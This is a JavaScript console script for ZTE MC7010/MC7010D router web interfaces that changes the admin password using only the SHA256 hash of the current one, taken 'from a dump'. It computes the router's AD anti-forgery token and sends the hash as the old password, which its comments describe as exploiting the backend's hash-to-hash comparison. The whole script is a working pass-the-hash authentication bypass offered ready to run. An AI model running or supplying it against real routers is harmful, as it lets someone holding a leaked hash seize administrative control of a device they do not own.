// ==========================================
// ZTE MC7010 / MC7010D PASSWORD CHANGE (Pass-the-Hash)
// ==========================================
// This script allows changing the Admin password knowing only the
// SHA256 Hash of the current password (retrieved from a dump).
// It bypasses the need to know the old plain-text password.

// 1. INPUT CONFIGURATION via Prompts
var oldHashFromDB = prompt("Enter the CURRENT SHA256 Hash (from dump):");
var newPassPlain = prompt("Enter the NEW Password (plain text):");

if (!oldHashFromDB || !newPassPlain) {
    console.error("❌ Operation cancelled. Both Hash and New Password are required.");
} else {
    // Sanitize Input
    oldHashFromDB = oldHashFromDB.trim().toUpperCase();

    console.log("🚀 STARTING NATIVE PASSWORD CHANGE SCRIPT...");

    // 2. Check for availability of native router functions
    // We rely on 'hex_md5' and 'paswordAlgorithmsCookie' being present in the DOM.
    if (typeof hex_md5 === 'undefined' || typeof paswordAlgorithmsCookie === 'undefined') {
        console.error("❌ ERROR: Native router functions (hex_md5 or paswordAlgorithmsCookie) are not loaded.");
        console.error("Make sure you are on the router's web interface (e.g., login page or home page).");
    } else {
        
        // 3. Request RD (Random Data) for AD security calculation
        var rdUrl = "/goform/goform_get_cmd_process?isTest=false&cmd=RD&_=" + new Date().getTime();
        
        $.get(rdUrl, function(response) {
            // Parse response
            var data = (typeof response === "string") ? JSON.parse(response) : response;
            var rd = data.RD || data.rd;
            
            if (!rd) { 
                console.error("❌ Error: RD (Random Data) not received."); 
                return; 
            }
            console.log("🔑 RD Received:", rd);

            // 4. Calculate AD (Accessible ID) using native functions
            // Logic derived from service.js: hex_md5( hex_md5(rd0 + rd1) + RD )
            // 'rd0' and 'rd1' are global variables usually present on the page
            var val_rd0 = (typeof rd0 !== 'undefined') ? rd0 : "";
            var val_rd1 = (typeof rd1 !== 'undefined') ? rd1 : "";
            
            console.log("Debug - rd0:", val_rd0, "rd1:", val_rd1);

            var inner = hex_md5(val_rd0 + val_rd1);
            var AD = hex_md5(inner + rd);
            
            console.log("🛡️ AD Calculated:", AD);

            // 5. Prepare Password Payloads
            
            // NEW PASSWORD:
            // We use the router's native function to hash the new plain text password.
            // This ensures the new password is stored in the correct format expected by the DB.
            var newPassHash = paswordAlgorithmsCookie(newPassPlain);
            
            // OLD PASSWORD (Pass-the-Hash):
            // The router usually hashes the input before sending. 
            // Since we don't know the plain text, we send the Hash directly.
            // This exploits the backend comparison logic (Hash == Hash).
            var oldPassPayload = oldHashFromDB; 

            console.log("📝 Sending request...");

            // 6. Send Change Password Request
            $.ajax({
                type: "POST",
                url: "/goform/goform_set_cmd_process",
                data: {
                    isTest: "false",
                    goformId: "CHANGE_PASSWORD",
                    oldPassword: oldPassPayload,
                    newPassword: newPassHash,
                    AD: AD
                },
                success: function(res) {
                    console.log("RAW RESULT:", res);
                    var resObj = res;
                    if (typeof res === "string") {
                        try {
                            resObj = JSON.parse(res);
                        } catch(e) {
                            console.error("Could not parse JSON", e);
                        }
                    }
                    // Check multiple success indicators
                    if(resObj.result == "0" || resObj.result === 0 || resObj.result == "success") {
                        console.log("%c✅ SUCCESS! Password changed successfully.", "color: green; font-size: 20px; font-weight: bold;");
                        console.log("Reloading in 3 seconds...");
                        setTimeout(function(){ window.location.reload(); }, 3000);
                    } else {
                        console.log("%c❌ FAILED.", "color: red; font-size: 16px; font-weight: bold;");
                        console.log("Details:", resObj);
                    }
                },
                error: function(err) {
                    console.error("❌ AJAX Error:", err);
                },
                dataType: "json"
            });
        });
    }
}
